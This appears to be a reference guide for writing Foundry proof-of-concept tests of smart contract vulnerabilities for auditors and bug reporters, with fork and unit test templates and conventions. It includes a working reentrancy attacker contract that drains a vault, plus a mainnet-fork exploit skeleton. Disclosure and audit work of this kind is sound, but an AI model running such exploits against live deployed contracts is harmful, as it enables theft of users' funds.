# Smart Contract Proof of Concept Reference

Comprehensive guide for writing proof-of-concept demonstrations for smart contract
vulnerabilities. Covers approach selection, Foundry test templates, common vulnerability
patterns, and cheatcode conventions.

## Approach Selection

When the target is a smart contract, ask the user which approach to use before writing code.

### forge-poc-templates

Before choosing a test approach, determine whether the PoC would benefit from
[forge-poc-templates](https://github.com/immunefi-team/forge-poc-templates/) (by Immunefi).
This library provides base contracts for flash loans, reentrancy, price manipulation, and
balance tracking — eliminating boilerplate for common DeFi exploit patterns.

**Recommend forge-poc-templates when the exploit involves:**
- Flash loans (Aave, Uniswap, Balancer, MakerDAO — callbacks and repayment handled automatically)
- Reentrancy with token callbacks (ERC677, ERC777, ERC1363, ERC721, ERC1155)
- Price oracle manipulation (Curve pools, etc.)
- Monetary impact tracking (automatic balance snapshots and profit logging)

**Do not recommend when:**
- The PoC is a simple unit test with no DeFi interactions
- The vulnerability is pure logic (access control, arithmetic) without callbacks or flash loans
- Adding the dependency would complicate reproduction for the maintainer

Always ask the user whether forge-poc-templates should be used, and include your recommendation
based on the criteria above. If using forge-poc-templates, **study the repository first** —
read the base contracts and examples before writing code. Consult
**`references/forge-poc-templates.md`** for the full API reference, installation instructions,
and usage patterns.

### Fork Test

Runs against a forked mainnet (or testnet) using live on-chain state via
`forge test --fork-url`. Replays real contract interactions against the actual deployment.

**When to use:**
- The vulnerability depends on deployed state, oracle prices, or liquidity pool balances
- Cross-contract or cross-protocol interactions are difficult to mock
- Flash loan attacks requiring real pool liquidity and flash loan providers
- Oracle manipulation requiring live AMM reserves
- The most convincing evidence is needed — proves exploitability against the actual deployment

**Trade-offs:**
- Requires an RPC endpoint (Alchemy, Infura, local archive node)
- Slower to run than unit tests
- May break if on-chain state changes (pin to a specific block to prevent this)

### Unit Test

A self-contained Foundry test that deploys minimal contracts and sets up synthetic state.
No external dependencies beyond the Foundry toolchain.

**When to use:**
- The vulnerability is in isolated logic (reentrancy, access control, arithmetic, state machine)
- The flaw does not depend on external protocol state
- Simpler to run, faster to iterate, easier for maintainers to reproduce without an RPC endpoint

**Trade-offs:**
- Cannot demonstrate vulnerabilities that depend on real protocol state
- Requires manually setting up any state the exploit depends on
- Less convincing for cross-protocol attack chains

### Default Selection

If the user has no preference, default to **unit test** for isolated logic flaws and **fork test**
when the exploit depends on live protocol state.

## Fork Test Template

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// Import or interface the target contracts
interface IVulnerableProtocol {
    function vulnerableFunction(uint256 amount) external;
}

contract ForkExploitTest is Test {
    // Target contract addresses on mainnet
    address constant TARGET = 0x...; // Vulnerable contract
    address constant TOKEN = 0x...;  // Relevant token

    IVulnerableProtocol target;
    address attacker;

    function setUp() public {
        // Fork mainnet at a specific block for reproducibility
        vm.createSelectFork(vm.envString("ETH_RPC_URL"), 18_500_000);

        target = IVulnerableProtocol(TARGET);
        attacker = makeAddr("attacker");

        // Fund attacker if needed
        deal(TOKEN, attacker, 1 ether);
    }

    function test_exploit() public {
        // Step 1: Record state before exploit
        uint256 balanceBefore = IERC20(TOKEN).balanceOf(attacker);

        // Step 2: Execute exploit as attacker
        vm.startPrank(attacker);
        // ... exploit steps with comments explaining each action ...
        target.vulnerableFunction(1 ether);
        vm.stopPrank();

        // Step 3: Assert the vulnerability — verify unexpected state change
        uint256 balanceAfter = IERC20(TOKEN).balanceOf(attacker);
        assertGt(balanceAfter, balanceBefore, "Exploit: attacker gained tokens");
    }
}
```

**Run command:**
```bash
forge test --match-test test_exploit --fork-url $ETH_RPC_URL -vvv
```

**Fork test conventions:**
- Pin to a specific block number in `vm.createSelectFork` for reproducibility
- Use `vm.envString("ETH_RPC_URL")` so the maintainer supplies their own RPC
- Use `deal()` to set up attacker balances instead of impersonating whales
- Use `vm.startPrank` / `vm.stopPrank` to simulate attacker context
- Assert the exploit outcome with descriptive failure messages
- Include `-vvv` in the run command for full trace output

### Resolving Interfaces for Fork Tests

Fork tests interact with already-deployed contracts, so the test file needs interface
definitions with correct function signatures. Getting this wrong causes silent failures
(the call reverts or hits a fallback) with no compiler warning.

- **Check the project first.** Look in `src/`, `interfaces/`, and `lib/` for existing
  interface files before writing your own. Many protocols ship their interfaces as part of
  the source tree.
- **Create minimal interfaces.** If no existing definition is available, define an interface
  containing only the functions the exploit calls — do not attempt to replicate the full ABI.
  This keeps the PoC readable and avoids unnecessary compilation errors from unrelated
  functions.
- **Use block explorer ABIs when available.** For verified contracts on Etherscan (or the
  chain's equivalent explorer), fetch the ABI to confirm exact function signatures, parameter
  types, and return types before writing the interface.
- **Keep interfaces inline or co-located.** Define them at the top of the test file (as shown
  in the template above) or in a single dedicated interfaces file alongside the test. The PoC
  must be self-contained so a reviewer can run it without hunting for dependencies.
- **Verify function selectors match the deployment.** A wrong parameter type or a missing
  `returns` clause produces a different four-byte selector. If the test silently fails or
  reverts with no useful error, compare your interface's selectors against the on-chain
  contract using `cast sig` or the explorer's ABI.

## Unit Test Template

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/VulnerableContract.sol";

contract ExploitTest is Test {
    VulnerableContract target;
    AttackContract attacker;

    function setUp() public {
        // Deploy vulnerable contract with minimal setup
        target = new VulnerableContract();

        // Seed initial state to reach vulnerable code path
        deal(address(target), 10 ether);

        // Deploy attacker contract if needed (e.g., for reentrancy)
        attacker = new AttackContract(address(target));
    }

    function test_exploit() public {
        // Step 1: Record pre-exploit state
        uint256 targetBalanceBefore = address(target).balance;

        // Step 2: Trigger the vulnerability
        attacker.attack{value: 1 ether}();

        // Step 3: Verify exploit outcome
        assertEq(address(target).balance, 0, "Exploit: vault fully drained");
        assertGt(address(attacker).balance, 1 ether, "Exploit: attacker profited");
    }
}

/// @notice Minimal attack contract demonstrating the exploit vector
contract AttackContract {
    VulnerableContract target;

    constructor(address _target) {
        target = VulnerableContract(_target);
    }

    function attack() external payable {
        target.withdraw(msg.value);
    }

    // Reentrancy callback
    receive() external payable {
        if (address(target).balance > 0) {
            target.withdraw(msg.value);
        }
    }
}
```

**Run command:**
```bash
forge test --match-test test_exploit -vvv
```

**Unit test conventions:**
- Deploy all contracts in `setUp()` — no external dependencies
- Use `deal()` to set balances, `vm.warp` for timestamps, `vm.roll` for block numbers
- If the exploit requires an attacker contract (reentrancy, callback-based attacks),
  define it in the same test file below the test
- Keep the attack contract minimal — only the logic needed to trigger the flaw
- Use descriptive assertion messages that state the exploit outcome

## General Foundry Conventions

- **Always include both `setUp()` and `test_*` functions.** Foundry discovers tests by the
  `test_` prefix.
- **Pin dependencies.** Specify the Solidity compiler version and Foundry version in comments
  or in `foundry.toml` configuration.
- **Use standard cheatcodes.** `vm.prank`, `vm.deal`, `vm.warp`, `vm.roll`, `vm.expectRevert`,
  `vm.expectEmit` — these are universally understood by Solidity auditors.
- **Log evidence.** Use `emit log_named_uint` or `console.log` for intermediate values that
  help maintainers understand the exploit flow.
- **One exploit per test function.** If demonstrating multiple attack vectors, use separate
  `test_` functions with descriptive names.

## Attacker Contracts vs Cheatcode Simulation

When the exploit involves callbacks, reentrancy, flash loans, or any on-chain interaction
pattern that spans multiple steps within a single transaction, build an actual attacker contract
rather than simulating the behavior with cheatcodes. Attacker contracts produce more realistic
and convincing PoCs because they demonstrate the actual exploit path an attacker would take
on-chain.

**Use cheatcodes for preconditions and context, not for core attack logic:**
- `deal()` — fund the attacker or seed contract balances
- `vm.prank` / `vm.startPrank` — impersonate an account to set up state or trigger the exploit entry point
- `vm.warp`, `vm.roll` — advance timestamps or block numbers to reach a vulnerable window
- `vm.expectRevert`, `vm.expectEmit` — assert expected side effects

**Use an attacker contract when the exploit requires:**
- **Reentrancy** — the attack is callback-driven; the attacker contract must implement `receive()` or `fallback()` to re-enter the target
- **Flash loans** — the attacker contract must implement the lender's callback interface (e.g., `onFlashLoan`, `executeOperation`) to receive and repay the loan atomically
- **Sandwich attacks** — the attacker contract must execute front-run and back-run operations within controlled transaction ordering
- **Any exploit requiring atomic multi-step execution** — if the attack only works when multiple calls happen within a single transaction, an attacker contract is the only realistic way to demonstrate it

**Keep attacker contracts minimal.** Only include the logic needed to trigger and complete the
exploit — constructor, attack entry point, and any required callbacks. Avoid unnecessary
abstractions or helper functions that obscure the exploit flow.

